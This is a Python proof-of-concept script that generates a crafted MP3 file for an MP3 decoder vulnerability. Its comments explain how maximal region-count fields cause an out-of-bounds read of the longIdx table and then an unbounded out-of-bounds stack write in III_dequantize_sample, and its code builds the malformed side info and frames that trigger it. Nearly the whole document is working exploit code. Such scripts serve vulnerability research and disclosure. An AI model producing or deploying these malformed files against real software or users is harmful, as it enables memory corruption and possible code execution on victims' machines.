#!/usr/bin/env python3
"""
PoC generator for VULN 001:
OOB Read in bandInfo.longIdx cascades to unbounded OOB Write in III_dequantize_sample

Root cause (layer3.c):
  - III_get_side_info_1() line 402-403:
      r0c = getbits_fast(4)  => 0-15
      r1c = getbits_fast(3)  => 0-7
      region2start = bandInfo[sfreq].longIdx[r0c+1+r1c+1] >> 1
    With r0c=15, r1c=7: index = 24, but longIdx has only 23 elements (0-22).
    Index 24 aliases to longDiff[1] (=4 for 44100 Hz), so region2start = 2.

  - III_dequantize_sample() lines 686-697:
      bv = big_values = 100
      region1 = region1start = longIdx[16] >> 1 = 162 >> 1 = 81
      region2 = region2start = 2
      since bv > region1 > region2:
        l[1] = region2 - l[0] = 2 - 81 = -79   (NEGATIVE)
      Loop: for(lp = l[1]; lp; lp--) runs ~2^32 times -> OOB write to stack xr[]
"""

import struct
import os

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def bits_to_bytes(bit_str: str) -> bytes:
    """Convert MSB-first bit string to bytes, padding trailing zeros."""
    pad = (8 - len(bit_str) % 8) % 8
    padded = bit_str + '0' * pad
    result = bytearray()
    for i in range(0, len(padded), 8):
        result.append(int(padded[i:i+8], 2))
    return bytes(result)


def build_side_info_mono() -> bytes:
    """
    MPEG1 Layer3 Mono (stereo=1) side info: 17 bytes = 136 bits.

    Layout from III_get_side_info_1():
      main_data_begin  [9]
      private_bits     [5]   (mono uses 5)
      scfsi[ch=0,gr=1] [4]
      --- 2 granules ---
      per-granule (59 bits):
        part2_3_length  [12]
        big_values      [9]   <- 100 to ensure bv > region2
        global_gain     [8]
        scalefac_compress [4]
        window_switching_flag [1] <- 0 (non-switched, triggers the else branch)
        table_select[0] [5]
        table_select[1] [5]
        table_select[2] [5]
        r0c             [4]   <- 15 (max) triggers OOB: index = r0c+1+r1c+1 = 24
        r1c             [3]   <- 7  (max)
        preflag         [1]
        scalefac_scale  [1]
        count1table_select [1]
    """
    bits = ""

    # Header fields
    bits += format(0,   '09b')  # main_data_begin = 0
    bits += format(0,   '05b')  # private_bits
    bits += format(0,   '04b')  # scfsi for ch=0, gr[1]

    # Two granules, identical
    for _gr in range(2):
        bits += format(100, '012b')  # part2_3_length = 100
        bits += format(100, '09b')   # big_values = 100  <- key: ensures bv > region2
        bits += format(100, '08b')   # global_gain = 100
        bits += format(0,   '04b')   # scalefac_compress
        bits += '0'                  # window_switching_flag = 0 <- non-switched block
        bits += format(1,   '05b')   # table_select[0] = 1
        bits += format(1,   '05b')   # table_select[1] = 1
        bits += format(1,   '05b')   # table_select[2] = 1
        bits += format(15,  '04b')   # r0c = 15 <- OOB trigger (r0c+1+r1c+1 = 24)
        bits += format(7,   '03b')   # r1c = 7  <- OOB trigger
        bits += '0'                  # preflag
        bits += '0'                  # scalefac_scale
        bits += '0'                  # count1table_select

    assert len(bits) == 136, f"Side info bit count wrong: {len(bits)}"
    data = bits_to_bytes(bits)
    assert len(data) == 17, f"Side info byte count wrong: {len(data)}"
    return data


# ---------------------------------------------------------------------------
# Build the MP3 frame
# ---------------------------------------------------------------------------
#
# MPEG1 Layer3 128 kbps 44100 Hz Mono, no CRC:
#   Byte 0: 0xFF   (sync hi)
#   Byte 1: 0xFB   (sync lo 3b | MPEG1=11 | Layer3=01 | noCRC=1)
#   Byte 2: 0x90   (bitrate=1001=128k | srate=00=44100 | pad=0 | priv=0)
#   Byte 3: 0xC0   (mono=11 | modeext=00 | copy=0 | orig=0 | emph=00)
#
# Frame size = floor(144 * 128000 / 44100) = 417 bytes
# Layout: 4 header + 17 side_info + 396 zero main_data = 417
#
HEADER      = bytes([0xFF, 0xFB, 0x90, 0xC0])
FRAME_SIZE  = 417   # 144 * 128000 // 44100
SIDE_INFO   = build_side_info_mono()
MAIN_DATA   = bytes(FRAME_SIZE - len(HEADER) - len(SIDE_INFO))  # 396 zero bytes

assert len(MAIN_DATA) == 396
FRAME = HEADER + SIDE_INFO + MAIN_DATA
assert len(FRAME) == FRAME_SIZE

# Repeat frame three times so the parser has multiple sync points to latch on to
mp3_bytes = FRAME * 3

# ---------------------------------------------------------------------------
# Write output
# ---------------------------------------------------------------------------
out_dir  = os.path.dirname(os.path.abspath(__file__))
out_path = os.path.join(out_dir, "vuln_001.mp3")

with open(out_path, "wb") as fh:
    fh.write(mp3_bytes)

print(f"[+] Wrote {len(mp3_bytes)} bytes ({len(mp3_bytes)//FRAME_SIZE} frames) to {out_path}")
print(f"[+] Side info hex: {SIDE_INFO.hex()}")
print(f"[+] Expected: r0c=15 r1c=7 -> longIdx[24]=longDiff[1]=4 -> region2start=2")
print(f"[+] Expected: big_values=100 -> bv=100 > region1=81 -> l[1]=2-81=-79 (OOB write)")
